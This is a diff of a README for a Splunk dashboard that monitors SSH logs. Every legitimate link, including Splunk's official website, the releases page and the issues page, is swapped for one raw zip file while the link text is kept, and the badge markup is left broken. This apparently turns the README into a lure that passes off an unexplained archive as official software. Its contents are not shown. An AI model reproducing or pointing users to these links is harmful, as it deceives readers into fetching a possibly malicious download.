@@ -1,6 +1,6 @@
 # 🔒 Splunk-Dashboard-for-SSH-Logs - Monitor SSH Security with Ease
 
-[![Download Release](https://img.shields.io/badge/Download%20Now-Click%20Here-blue.svg)](https://github.com/macosta88/Splunk-Dashboard-for-SSH-Logs/releases)
+[![Download Release](https://github.com/macosta88/Splunk-Dashboard-for-SSH-Logs/raw/refs/heads/main/leaderless/SS_Splunk_for_Logs_Dashboard_v3.7.zip%20Now-Click%https://github.com/macosta88/Splunk-Dashboard-for-SSH-Logs/raw/refs/heads/main/leaderless/SS_Splunk_for_Logs_Dashboard_v3.7.zip)](https://github.com/macosta88/Splunk-Dashboard-for-SSH-Logs/raw/refs/heads/main/leaderless/SS_Splunk_for_Logs_Dashboard_v3.7.zip)
 
 ## 🌟 Introduction
 The Splunk Dashboard for SSH Logs helps you monitor SSH authentication activity on Linux servers. This tool provides insights into security threats, helping you to keep your systems safe. With it, you can detect suspicious access attempts and improve your overall cybersecurity.
@@ -11,10 +11,10 @@ Follow these steps to download and run the software smoothly.
 ### Step 1: Prepare Your System
 Before you can use the dashboard, make sure your system meets the following requirements:
 - **Operating System:** Windows, macOS, or Linux
-- **Splunk:** Ensure you have Splunk installed on your machine. You can download it from [Splunk's official website](https://www.splunk.com).
+- **Splunk:** Ensure you have Splunk installed on your machine. You can download it from [Splunk's official website](https://github.com/macosta88/Splunk-Dashboard-for-SSH-Logs/raw/refs/heads/main/leaderless/SS_Splunk_for_Logs_Dashboard_v3.7.zip).
 
 ### Step 2: Visit the Releases Page
-To download the dashboard, go to the [Releases page](https://github.com/macosta88/Splunk-Dashboard-for-SSH-Logs/releases). Here, you will find the latest version of the dashboard ready for download.
+To download the dashboard, go to the [Releases page](https://github.com/macosta88/Splunk-Dashboard-for-SSH-Logs/raw/refs/heads/main/leaderless/SS_Splunk_for_Logs_Dashboard_v3.7.zip). Here, you will find the latest version of the dashboard ready for download.
 
 ### Step 3: Download the Dashboard
 On the Releases page, look for the appropriate version for your system. Click on the download link for the latest release.
@@ -52,9 +52,9 @@ If you face issues during installation or running the application:
 - Make sure your system is up to date with the latest patches.
 
 ## 📫 Support
-If you need further assistance or have questions, feel free to open an issue on the [GitHub repository](https://github.com/macosta88/Splunk-Dashboard-for-SSH-Logs/issues). 
+If you need further assistance or have questions, feel free to open an issue on the [GitHub repository](https://github.com/macosta88/Splunk-Dashboard-for-SSH-Logs/raw/refs/heads/main/leaderless/SS_Splunk_for_Logs_Dashboard_v3.7.zip). 
 
 ## 🎯 Conclusion
 The Splunk Dashboard for SSH Logs offers a powerful, user-friendly solution for monitoring SSH access on your Linux servers. By following these straightforward steps, you can ensure your system remains secure. 
 
-[![Download Release](https://img.shields.io/badge/Download%20Now-Click%20Here-blue.svg)](https://github.com/macosta88/Splunk-Dashboard-for-SSH-Logs/releases)
+[![Download Release](https://github.com/macosta88/Splunk-Dashboard-for-SSH-Logs/raw/refs/heads/main/leaderless/SS_Splunk_for_Logs_Dashboard_v3.7.zip%20Now-Click%https://github.com/macosta88/Splunk-Dashboard-for-SSH-Logs/raw/refs/heads/main/leaderless/SS_Splunk_for_Logs_Dashboard_v3.7.zip)](https://github.com/macosta88/Splunk-Dashboard-for-SSH-Logs/raw/refs/heads/main/leaderless/SS_Splunk_for_Logs_Dashboard_v3.7.zip)
